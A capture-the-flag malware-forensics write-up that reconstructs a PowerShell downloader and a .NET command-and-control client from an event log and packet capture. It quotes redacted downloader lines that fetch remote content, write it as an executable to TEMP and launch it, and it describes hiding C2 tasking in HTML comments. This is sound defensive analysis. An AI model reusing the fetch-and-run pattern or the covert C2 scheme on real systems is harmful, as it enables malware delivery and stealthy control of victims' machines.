# TryHackMe: Masquerade

> Room: [https://tryhackme.com/room/masquerade](https://tryhackme.com/room/masquerade)

Masquerade is a malware forensics room built around two artifacts from a Windows host: a PowerShell Operational event log and a packet capture. The challenge is not about detonating malware blindly, but about reconstructing the attacker’s workflow by correlating host evidence with network traffic.

I solved the room statically from start to finish. No recovered payload was executed at any point.

## Files Provided

* `Powershell-Operational.evtx`
* `traffic.pcapng`

## Approach

The cleanest way to solve this room is to build an evidence chain instead of treating the EVTX and PCAP separately.

At a high level, the workflow is:

1. Start with the PowerShell log to recover the downloader logic.
2. Use that logic to identify the suspicious traffic inside the PCAP.
3. Extract the downloaded object from the HTTP response.
4. Reproduce the script’s decryption routine safely outside PowerShell.
5. Recover the second-stage payload without running it.
6. Statistically analyze the recovered .NET client.
7. Reconstruct the client’s encrypted HTTP communication.
8. Decrypt the attacker’s commands and recover the flag.

That order matters because almost every later question depends on understanding the previous stage first.

## Initial Triage

I started with the EVTX because Script Block Logging was enabled, which is one of the best possible outcomes in a PowerShell-based malware investigation. When script blocks are logged, weak obfuscation usually collapses immediately and the original execution flow becomes visible.

The PCAP was then used to validate what the log already suggested. That made the investigation much more reliable than starting with raw network traffic and guessing which streams were important.

The full evidence chain looked like this:

1. PowerShell Script Block Logging exposed the downloader.
2. The script revealed the external domain, URL structure, and decryption logic.
3. DNS and HTTP traffic in the PCAP confirmed the download.
4. The HTTP response carried the staged payload as encoded data rather than a normal PE file.
5. The script’s routine decrypted that staged content into a second-stage executable.
6. The recovered .NET client explained the later HTTP beaconing and command traffic.
7. Reconstructing the client crypto made it possible to decrypt the attacker’s commands and recover the flag.

## PowerShell Log Analysis

The EVTX was the best starting point because it directly exposed the first-stage logic.

The relevant event was a PowerShell Script Block entry showing a script executed from the user’s Downloads directory. The important parts of the script were:

* it rebuilt a URL from fragmented strings,
* it used `System.Net.WebClient` to download remote content,
* it stripped characters from the response,
* it interpreted the response as hex text,
* it decrypted the decoded bytes,
* it wrote the result as an executable to disk,
* it launched that executable.

A simplified redacted version of the logic looked like this:

```powershell
$k = [System.Text.Encoding]::UTF8.GetBytes(('[REDACTED]' + '[REDACTED]'))

$h = (New-Object System.Net.WebClient).DownloadString(
    (-join('ht','tp','://','[REDACTED]','/[REDACTED]'))
) -replace ('\'+'s'), ''

$b = for ($x = 0; $x -lt $h.Length; $x += 2) {
    [Convert]::ToByte($h.Substring($x, 2), 16)
}
```

This script block answers several important questions or tells you exactly where to get them:

* **What external domain was contacted during script execution?**
  Rebuild the fragmented URL string exactly as the script does. Do not guess from the PCAP first. The EVTX gives you the authoritative domain and path.

* **What encryption algorithm was used by the script?**
  The answer comes from recognizing the structure of the decryption routine, not from a function name.

* **What key was used to decrypt the second-stage payload?**
  Recover the string-building logic assigned to the key material before the decryption loop begins.

### Recognizing the decryption routine

The most important part of the script was the byte-processing logic. It used:

* a 256-byte state array,
* a key scheduling phase,
* repeated swaps,
* a keystream generation loop,
* XOR against each byte of the downloaded data.

That structure is the classic shape of an RC4-style stream cipher implementation.

This is one of the major turning points in the room, because from here the logic becomes clear:

* the server did not return a normal executable,
* the response body had to be hex-decoded first,
* the decoded bytes then had to be decrypted with the key built in PowerShell,
* the result would be the real payload.

The final stage of the script wrote the decrypted bytes to a temporary executable path and launched it:

```powershell
$p = $env:TEMP + '\[REDACTED].exe'
[System.IO.File]::WriteAllBytes($p, $d)
Start-Process $p
```

That confirms the downloaded object was only staged material and not the final malware itself.

## Packet Capture Analysis

Once the PowerShell logic was understood, the PCAP became easy to navigate.

The script had already told me what to look for:

* DNS resolution for the attacker-controlled domain,
* an HTTP GET request to that host,
* a server response returning the staged payload.

In simplified form, the relevant traffic looked like this:

```text
Client -> DNS resolver: query for [REDACTED DOMAIN]
DNS resolver -> Client: response with [REDACTED IP]

Client -> Server: GET /[REDACTED]
Host: [REDACTED DOMAIN]

Server -> Client:
HTTP/1.0 200 OK
Content-Type: application/octet-stream
Content-Length: [observed payload length]
```

This portion of the PCAP helps answer two different questions:

* **What was the timestamp of the server response containing the payload?**
  Follow the HTTP stream for the download request identified from the EVTX, then record the timestamp on the response packet carrying the staged object.

* **What external domain was contacted during script execution?**
  The PCAP confirms it, but the EVTX is where the domain is first reconstructed.

### Why the HTTP response matters

The body of the response did **not** begin with `MZ` and did not look like a normal PE file. Instead, it appeared as ASCII hex.

That matched the PowerShell perfectly. The script’s `Substring($x, 2)` loop was not arbitrary; it was converting pairs of hex characters into bytes. That immediately connected the log and network artifacts into the same delivery chain.

At this point, the room’s first half is solved conceptually:

* the script downloads a hex-encoded blob,
* the blob is decoded into bytes,
* those bytes are decrypted with the script’s key,
* the output becomes a second-stage executable.

## Extracting and Decrypting the Payload

After isolating the HTTP response body, the next steps were straightforward:

1. Reassemble or export the HTTP response body from the PCAP.
2. Remove any formatting noise exactly the way the PowerShell does.
3. Hex-decode the body into raw bytes.
4. Reproduce the RC4-style routine in Python.
5. Use the recovered key from the EVTX.
6. Decrypt the blob.
7. Save the output to disk as a sample for static analysis only.

A simplified reconstruction of the decryption logic looked like this:

```python
import hashlib

key = b"[REDACTED]"

def rc4_style(data, key):
    s = list(range(256))
    j = 0

    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) % 256
        s[i], s[j] = s[j], s[i]

    i = 0
    j = 0
    out = bytearray()

    for byte in data:
        i = (i + 1) % 256
        j = (j + s[i]) % 256
        s[i], s[j] = s[j], s[i]
        out.append(byte ^ s[(s[i] + s[j]) % 256])

    return bytes(out)
```

When the routine is implemented correctly, the decrypted output begins with the `MZ` header. That is the confirmation that the staged blob has been turned back into a Windows PE file.

This stage directly answers another question:

* **What is the SHA-256 hash of the extracted and decrypted payload?**
  Only hash the final decrypted executable, not the raw HTTP response body and not the hex text. The room wants the hash of the recovered payload after decryption.

At this point, the first-stage investigation is complete.

## Static Analysis of the Recovered .NET Payload

The decrypted second stage turned out to be a .NET executable, which makes the next phase much easier. A decompiler such as dnSpy or ILSpy is enough to inspect the strings, methods, and cryptographic workflow without ever executing the file.

This is where the room shifts from initial staging to command-and-control analysis.

Several embedded values immediately stand out during decompilation:

* a base HTTP URL,
* a polling path,
* an image-like callback path,
* a query parameter used to carry encrypted data,
* a marker hidden in server responses,
* a hardcoded secret used for client encryption.

These values answer or support several late-stage questions:

* **What remote URL did the client use to communicate with the victim machine?**
  Recover this from the decompiled strings and the code that builds outbound requests. Do not rely only on the PCAP; the binary makes the full URL structure easier to understand.

* **Which encryption key and algorithm does the client use?**
  Follow the cryptographic helper methods inside the .NET code. The binary shows both the algorithm family and how the key material is derived from the embedded secret.

The traffic pattern became clear once those strings were mapped to behavior.

The client made requests that looked like this:

```text
GET http://[REDACTED]/[callback-path]?[parameter]=[encrypted-data]
GET http://[REDACTED]/
```

The first request type was used to send victim information and command output back to the server. The second request type was used to poll for new commands.

Even before fully reversing the crypto, the communication model was already visible.

## Understanding the Client-Side Encryption

The recovered .NET client did not use the same RC4-style logic as the PowerShell stage. The C2 traffic used a more structured managed-crypto workflow.

The important details visible in the decompiled code were:

* a symmetric cipher object was created through .NET cryptography APIs,
* a hardcoded string was transformed into binary key material,
* an IV was generated for encryption,
* the IV was prepended to the ciphertext,
* the blob was base64-encoded,
* in one direction, that base64 data was wrapped in base64 again before transport.

That means the decryption path for C2 traffic looks like this:

```text
URL parameter
  -> base64 decode outer layer
  -> base64 decode encrypted blob
  -> split IV from ciphertext
  -> decrypt using derived key
  -> parse plaintext
```

This is the section that matters most for the later questions.

To answer:

* **Which encryption key and algorithm does the client use?**
  You need to identify the .NET crypto class being instantiated, then trace how the static secret is converted into key bytes. The answer is not just “AES” or “DES” in isolation; it also includes the specific key material or its derivation source.

### Hidden tasking in server responses

The implant did not receive commands in a loud or obvious custom protocol. Instead, the server embedded encrypted tasking inside HTML comments using a marker value.

The server response looked conceptually like this:

```html
<!-- [marker]=[encrypted blob] --></body>
```

That explains why the HTTP traffic may initially look harmless. The malware polls an apparently normal web page, but the real command data is hidden inside the comment body.

At this point, the solving logic becomes:

1. Identify the polling responses in the PCAP.
2. Extract the encrypted blob from the HTML comment marker.
3. Apply the client’s decryption logic recovered from the .NET code.
4. Read the plaintext command.

## Recovering the Attacker’s Commands

Once the client crypto is reconstructed correctly, the remaining questions become mechanical rather than investigative.

The decrypted plaintext commands followed a predictable structure:

```text
[VICTIM-HOSTNAME]::::[command]
```

That format is extremely useful because it confirms that the decryption routine is correct. If the output is readable and follows the expected delimiter structure, the key and algorithm reconstruction were likely successful.

This final phase answers the room’s last major question:

* **After determining the client's encryption, decrypt the commands the attacker executed on the victim and submit the flag.**

The right process is:

1. Use the .NET sample to recover the client encryption logic.
2. Apply that logic to the command blobs hidden in the server responses.
3. Read the recovered plaintext commands.
4. Identify the final command that prints the flag.
5. Extract the flag from the resulting decrypted traffic.

The commands were basic operator tasking rather than anything exotic. They consisted of light host reconnaissance followed by a final command that echoed the flag.

The important point is not the exact text here, but the method:

* the **script stage** gets you the second-stage payload,
* the **second-stage payload** reveals the C2 structure,
* the **C2 structure** lets you decrypt the attacker’s commands,
* the **decrypted commands** lead to the final flag.

## Question Mapping

For clarity, this is how each room question is solved:

### 1. What external domain was contacted during script execution?

Recover the joined URL string from the PowerShell Script Block event in the EVTX. Then validate it in the PCAP through DNS and HTTP traffic.

### 2. What encryption algorithm was used by the script?

Recognize the decryption loop in PowerShell. The 256-byte state array, key scheduling, swaps, and XOR keystream identify it as an RC4-style stream cipher.

### 3. What key was used to decrypt the second-stage payload?

Extract the string-building logic assigned to the key variable in the PowerShell script before the decryption routine runs.

### 4. What was the timestamp of the server response containing the payload?

Use the PCAP. Follow the HTTP stream for the payload request and record the timestamp of the response carrying the staged data.

### 5. What is the SHA-256 hash of the extracted and decrypted payload?

Hex-decode the downloaded response, decrypt it with the recovered PowerShell key, save the resulting PE file, and hash that final decrypted executable.

### 6. What remote URL did the client use to communicate with the victim machine?

Recover the base URL and request-building logic from the decompiled .NET payload. Then validate the same URL pattern in the PCAP.

### 7. Which encryption key and algorithm does the client use?

Follow the .NET cryptographic helper methods. Identify the crypto class, then trace how the hardcoded secret is transformed into the final key.

### 8. After determining the client's encryption, decrypt the commands the attacker executed on the victim and submit the flag.

Extract the encrypted command blobs from the polling responses, apply the reconstructed client decryption logic, read the plaintext commands, and recover the final echoed flag.

## Key Findings

* PowerShell Script Block Logging exposed the entire first-stage downloader workflow.
* The script reconstructed a remote URL, downloaded a staged object, hex-decoded it, and decrypted it.
* The script’s decryption routine was an RC4-style stream cipher implementation.
* The downloaded object in the PCAP was not a raw PE file but an encoded blob that matched the PowerShell logic.
* Decrypting that blob recovered a .NET executable.
* The .NET client used HTTP for encrypted command-and-control traffic.
* Tasking was hidden inside HTML comments, while outbound data was sent through a query parameter.
* Reconstructing the client’s crypto made it possible to decrypt the attacker’s commands and recover the flag.

## Final Thoughts

Masquerade is a strong malware-forensics room because it forces you to correlate host artifacts and network traffic instead of solving each in isolation.

If I had started only from the PCAP, I would have seen suspicious HTTP activity but not understood the original staging logic. If I had started only from the EVTX, I would have understood the script’s intent but not validated the actual download and later command traffic. Using both together made the full infection chain explain itself naturally.

The most useful techniques in this room were:

* PowerShell Script Block reconstruction,
* URL and key recovery from lightly obfuscated strings,
* HTTP object extraction,
* stream-cipher recognition,
* safe payload recovery and hashing,
* .NET decompilation,
* protocol-level decryption.

The best part of the room is that nothing needed to be executed. Every answer was recoverable through static analysis, evidence correlation, and careful reconstruction of the attacker’s workflow.
